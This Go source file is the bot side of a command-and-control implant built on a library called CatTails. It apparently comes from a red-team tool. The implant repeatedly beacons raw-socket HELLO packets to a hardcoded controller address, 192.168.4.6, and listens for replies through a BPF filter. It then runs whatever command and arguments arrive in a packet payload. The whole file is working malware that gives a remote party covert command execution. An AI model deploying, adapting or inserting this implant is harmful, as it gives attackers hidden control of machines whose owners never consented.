package main

import (
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/oneNutW0nder/CatTails/cattails"
	"golang.org/x/sys/unix"
)

var lastCmdRan string

// Continuously send HELLO messages so that the C2 can respond with commands
func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
	for {
		fd := cattails.NewSocket()
		defer unix.Close(fd)

		packet := cattails.CreatePacket(iface, src, dst, 18000, 1337, dstMAC, cattails.CreateHello(iface.HardwareAddr, src))

		addr := cattails.CreateAddrStruct(iface)

		cattails.SendPacket(fd, iface, addr, packet)
		fmt.Println("[+] Sent HELLO")
		// Send hello every 5 seconds
		time.Sleep(5 * time.Second)
	}
}

func botProcessPacket(packet gopacket.Packet) {

	fmt.Println("[+] Payload Received")

	// Get command payload and trime newline
	data := string(packet.ApplicationLayer().Payload())
	data = strings.Trim(data, "\n")

	// Split into list to get command and args
	payload := strings.Split(data, " ")
	fmt.Println("[+] PAYLOAD:", payload)
	command := payload[1]
	args := payload[2:]

	// Only run command if we didn't just run it
	if lastCmdRan != command {
		fmt.Println("[+] ARGS:", args)

		// Run the command and get output
		out, err := exec.Command(command, args...).Output()
		if err != nil {
			fmt.Println("\n[-] ERROR:", err)
		}
		// Save last command we just ran
		lastCmdRan = command
		fmt.Println("[+] OUTPUT:", string(out))
	} else {
		fmt.Println("[!] Already ran command", command)
	}
}

func main() {

	// Create BPF filter vm
	vm := cattails.CreateBPFVM(cattails.FilterRaw)

	// Create reading socket
	readfd := cattails.NewSocket()
	defer unix.Close(readfd)

	fmt.Println("[+] Socket created")

	// Get information that is needed for networking
	iface, src := cattails.GetOutwardIface("8.8.8.8:80")
	fmt.Println("[+] Using interface:", iface.Name)

	dstMAC, err := cattails.GetRouterMAC()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] DST MAC:", dstMAC.String())
	fmt.Println("[+] Starting HELLO timer")

	// Start hello timer
	// Set the below IP to the IP of the C2
	// 192.168.4.6
	go sendHello(iface, src, net.IPv4(192, 168, 4, 6), dstMAC)

	// Listen for responses
	fmt.Println("[+] Listening")
	for {
		packet := cattails.BotReadPacket(readfd, vm)
		if packet != nil {
			go botProcessPacket(packet)
		}
	}

}
